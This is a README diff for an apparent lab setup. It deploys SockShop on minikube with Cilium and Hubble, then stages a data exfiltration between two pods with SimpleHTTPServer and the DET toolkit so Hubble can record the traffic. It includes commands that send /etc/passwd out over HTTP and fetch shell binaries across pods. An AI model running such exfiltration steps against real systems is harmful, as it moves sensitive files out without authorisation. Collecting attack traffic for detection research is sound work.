@@ -45,12 +45,74 @@ Cilium Documentation: https://docs.cilium.io/en/stable/gettingstarted/
 2. Fix Cilium data collection
 3. Run data exfiltration attack
 
-##Deployment Instruction[Kirtan]
-4. Start minikube: `minikube start --network-plugin=cni -p CLUSTER_NAME`
-5. Enable cilium on minikube : `cilium install`
-6. Verify cilium is enabled : `cilium status`
-7. If you are running for the first time, verify cilium connectivity:`cilium connectivity test` : It takes couple of minutes for this to execute.
-8. Enable hubble on cilium : `cilium hubble enable`
-9. Enable port forwarding : `cilium hubble port-forward&`
-10. Check if hubble is collecting flows : `hubble status`
-11. Deploy SockShop: `bash deploy_sockshop.sh`
+## Deployment Instruction [Kirtan]
+1. Start minikube: `minikube start --network-plugin=cni -p CLUSTER_NAME`
+2. Enable cilium on minikube : `cilium install`
+3. Verify cilium is enabled : `cilium status`
+4. If you are running for the first time, verify cilium connectivity:`cilium connectivity test` : It takes couple of minutes for this to execute.
+5. Enable hubble on cilium : `cilium hubble enable`
+6. Enable port forwarding : `cilium hubble port-forward&`
+7. Check if hubble is collecting flows : `hubble status`
+8. Deploy SockShop: `bash deploy_sockshop.sh`
+
+## DET tool setup
+There are 2 containers: users-db and catalogue-db which allows installing dependencies needed by allowing apt-install and updates.
+Hence, our goal is to make one of them our DET server i.e. one sending data and other one as client i.e. receiving data.
+
+In order to do that, we first create an additional service on a new port of container users-db as container does not allow
+us to run service on a new port once its turned on. Hence,  bash deploy_sockshop_with_det.sh will deploy
+sockshop_modified_full_cluster_with_det.yaml which is same as deploy_sockshop_modified_full_cluster.yaml with a new port
+added to users_db 27018  LOC :809 as well as a new Service user-db-det: LOC 844.
+
+Here, we will use users_db as our server and catalogue_db as our client.
+
+
+### Deploy Sock-shop with DET
+1. run `bash deploy_sockshop_with_det.sh`
+
+Once the sock-shop completes deployment,
+### Getting needed metadata of user-db and catalogue-db pods
+1. Get pod ids of users-db and catalogue-db from : `kubectl get pods  -n sock-shop` 
+2. Get IP address of user-db-det from : `kubectl get services -o wide -n sock-shop`
+
+### Preparing User-db for DET
+1. SSH into users_db using `kubectl exec --stdin --tty user-db-XXXXXXX  --namespace sock-shop -- /bin/bash`
+2. For simplehttpserver communication, run following commands:
+   1. `apt-get -o Acquire::ForceIPv4=true update`
+   2. `apt-get --force-yes -y -o Acquire::ForceIPv4=true install python`
+3. For DET, run all the commands given in the file det_dependencies_to_install.txt    
+
+### Preparing Catalogue-db for DET
+1. SSH into users_db using `kubectl exec --stdin --tty catalogue-db-XXXXXXX  --namespace sock-shop -- /bin/bash`
+2. For simplehttpserver communication, run following commands:
+   1. `apt-get -o Acquire::ForceIPv4=true update`
+   2. `apt-get --force-yes -y -o Acquire::ForceIPv4=true install curl wget`
+3. For DET, run all the commands given in the file det_dependencies_to_install.txt   
+
+### Annotating pods for datacollection
+1. Annotate user-db pod for cilium data collection: `kubectl annotate pod user-db-XXXX -n sock-shop io.cilium.proxy-visibility="<Egress/27018/TCP/HTTP>,<Ingress/27018/TCP/HTTP>"`
+2. Annotate catalogue-db pod for cilium data collection: `kubectl annotate pod catalogue-db-XXXXx -n sock-shop io.cilium.proxy-visibility="<Egress/27018/TCP/HTTP>,<Ingress/27018/TCP/HTTP>"`
+
+
+### Turn on hubble data collection
+1. Run this command to observe http traffic between server and client and write it to file : `hubble observe  --follow --protocol http -o json > det_data.txt`
+2. Run this command to observe http traffic between server and client in command line : ` hubble observe  --follow --protocol http -o json `
+
+### SimpleHTTPPythonServer DET
+1. On users-db, start the python server on port 27018 : `python -m SimpleHTTPServer 27018`
+2. On catalogue-db use wget/curl to retrieve files : `curl 10.103.13.14:27018/bin/sh` or `wget 10.103.13.14:27018/bin/bash`
+3. Observe traffic in hubble
+
+### DET using PaulSec/DET tool
+Assuming you have installed all the commands in the det_dependencies_to_install.txt on both the catalogue-db and user-db, follow the next steps:
+1. Install vim to edit config files for det on both the pods using : `apt-get update`; `apt search vim`; `apt-get install vim`
+2. On user-db, 
+   1. Open config-server.json and replace http port with 27018 on Line 5 and save the file
+   2. Then start the DET server using following command : `python det.py -L -c ./config-server.json -p http`
+3. On catalogue-db,
+   1. Open config-client.json and replace http port with 27018 on Line 5 and replace IP address with whatever IP you got for user db in metadata colleciton.
+   2. After that run the following command to retrieve file that you wish to retrieve: 
+      1. `python det.py -c ./config-client.json -p http -f /etc/passwd`
+   3. You can also configure max_time_sleep, min_time_sleep,max_bytes_read, min_bytes_read in the config files of both server and client
+
+
